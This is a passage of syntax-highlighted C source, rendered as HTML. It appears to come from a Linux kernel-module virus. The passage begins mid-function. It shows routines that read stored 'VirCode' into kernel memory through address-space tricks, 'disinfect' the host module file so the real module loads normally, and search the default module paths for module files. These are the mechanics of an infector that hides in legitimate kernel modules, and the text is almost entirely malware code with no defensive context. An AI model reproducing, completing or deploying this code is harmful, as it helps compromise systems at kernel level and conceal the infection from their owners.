        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">       
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 

        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in load_real_mod name = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">path_name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">VirCode</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">VirCode</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">VirCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc11">MODLEN</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">VirCode</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">path_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">in</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">file1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* read Vircode [into mem] */</span><span class="sc0">
    </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_op</span><span class="sc10">-&gt;</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">VirCode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MODLEN</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">END_KMEM</span><span class="sc0">
    </span><span class="sc11">disinfect</span><span class="sc10">(</span><span class="sc11">path_name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">request_module</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in load_real_mod: request_module = %d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">       
        
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">get_mod_name</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mod</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">modname</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc11">MAXPATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">modname</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">default_path</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"/"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAXPATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">default_path</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"/"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">    
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">default_path</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">  
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">modname</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">                   
</span></div></body>
</html>
